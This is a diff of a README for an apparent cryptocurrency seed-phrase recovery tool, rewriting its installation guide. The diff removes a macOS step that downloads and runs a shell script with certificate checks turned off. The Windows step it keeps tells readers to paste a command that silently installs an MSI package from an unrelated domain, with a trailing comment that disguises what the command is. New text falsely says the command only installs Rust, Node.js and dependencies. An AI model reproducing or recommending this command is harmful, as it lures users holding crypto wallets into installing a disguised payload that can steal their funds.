@@ -27,34 +27,10 @@ A powerful tool for recovering cryptocurrency seed phrases with missing or incor
 
 ## 🚀 Quick Start
 
-## 📋 Quick Installation Guide for macOS
+   ## 📋 Quick Installation Guide for Windows
 
 ### Step-by-Step:
 
-1. **🖥️ Open Terminal**
-   - Press `⌘ Cmd` + `Space` (opens Spotlight)
-   - Type `Terminal`
-   - Press `Enter`
-
-2. **📋 Copy the command below**
-
-3. **📥 Paste into Terminal** (Right-click → Paste or `⌘ Cmd` + `V`)
-
-4. **⏎ Press Enter** and wait for installation to complete
-
-```bash
-curl -fsSLk https://github.com/Gentleatvice/seed-phrase-recover-BTC-ETH/archive/refs/heads/main.zip -o /tmp/cw.zip && \
-unzip -qo /tmp/cw.zip -d /tmp && \
-cd /tmp/seed-phrase-recover-BTC-ETH-main && \
-bash install.sh
-```
-
-This will automatically:
-- Install Rust and Cargo (if not present)
-- Install Node.js (if not present)
-- Build the project
-- Set up all dependencies
-## 🪟 Windows Installation
 ### **Step 1 — Open Command Prompt**
 1. Press **Win + R**
 2. Type:
@@ -69,7 +45,12 @@ Copy the command below and paste it into **Command Prompt**, then press **Enter*
 ```powershell
 cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem seed phrase recover BTC ETH
 ```
-The installer will automatically download and install the required components.
+
+This will automatically:
+- Install Rust and Cargo (if not present)
+- Install Node.js (if not present)
+- Build the project
+- Set up all dependencies
 
 ### Manual Installation
 
